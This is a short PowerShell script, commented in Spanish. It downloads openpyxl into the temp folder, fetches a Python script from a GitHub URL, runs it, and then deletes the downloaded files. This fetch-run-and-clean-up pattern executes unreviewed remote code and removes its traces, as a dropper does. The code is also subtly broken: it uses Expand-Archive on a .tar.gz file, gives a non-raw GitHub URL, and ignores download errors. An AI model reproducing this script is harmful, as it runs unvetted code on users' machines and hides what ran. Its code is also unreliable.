# Descargar openpyxl manualmente
$openpyxlURL = 'https://files.pythonhosted.org/packages/14/a2/6de434fa5d52ec418b0cd9eaffc81d23514ed971e7c3b9d7025eb9c1666f/openpyxl-3.0.9.tar.gz'
$openpyxlPath = "$env:TEMP\openpyxl.tar.gz"
Invoke-WebRequest -Uri $openpyxlURL -OutFile $openpyxlPath

# Descomprimir openpyxl
Expand-Archive -Path $openpyxlPath -DestinationPath "$env:TEMP\openpyxl"

# Ruta donde se guardará el script de Python
$pythonScriptPath = "$env:TEMP\script.py"

# URL de tu script de Python
$pythonScriptURL = 'https://github.com/astronomyc/filesRecents/main.py'

try {
    $response = Invoke-WebRequest -Uri $pythonScriptURL -UseBasicParsing
}
catch {
    # Manejar cualquier error que ocurra durante la descarga
    Write-Host "Ocurrió un error durante la ejecución del script."
}

# Guardar el contenido descargado en un archivo
Set-Content -Path $pythonScriptPath -Value $response.Content

# Añadir la ruta de openpyxl al PYTHONPATH
$env:PYTHONPATH = "$env:TEMP\openpyxl"

# Ejecutar el script de Python utilizando el intérprete de Python
python.exe $pythonScriptPath

# Limpiar los archivos descargados después de ejecutar el script
Remove-Item -Path $pythonScriptPath
Remove-Item -Path $openpyxlPath
Remove-Item -Path "$env:TEMP\openpyxl" -Recurse -Force
